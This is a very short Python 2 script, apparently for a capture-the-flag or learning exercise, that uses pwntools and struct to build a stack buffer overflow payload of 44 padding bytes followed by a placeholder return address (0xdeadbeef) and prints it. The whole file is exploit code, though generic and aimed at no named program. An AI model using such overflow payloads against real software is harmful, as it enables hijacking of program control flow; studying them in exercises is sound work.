#!/usr/bin/env python

import struct
from pwn import *

def p(x):
    return struct.pack("<I", x)

ret = p(0xdeadbeef)
buf = ''
buf += 'A' * 44
buf += ret

print buf
